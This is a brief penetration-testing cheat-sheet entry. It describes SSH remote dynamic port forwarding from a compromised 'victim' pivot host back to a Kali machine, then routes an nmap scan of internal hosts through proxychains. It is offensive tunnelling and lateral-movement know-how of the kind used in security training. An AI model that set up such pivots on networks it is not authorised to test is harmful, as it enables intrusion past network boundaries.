---
title: SSH Remote Dynamic Port Forwarding
category: tunnels
subcategory: ssh
os: linux
command: ssh -N -R port user@kali
tools: ssh, proxychains
---


Combines remote forwarding (initiated from the victim outbound) with the flexibility of a SOCKS proxy. Requires OpenSSH 7.6+ on the client.

### From the pivot

```bash
ssh -N -R 8877 kali@192.168.118.12
```

`-R 8877` (no full socket spec) means SOCKS proxy listening on Kali port 8877.

### Verify on Kali

```bash
sudo ss -ntplu
```

### proxychains config

```
[ProxyList]
socks5 127.0.0.1 8877
```

### Scan internal targets through it

```bash
proxychains nmap -vvv -sT --top-ports=20 -Pn 10.8.20.50
```
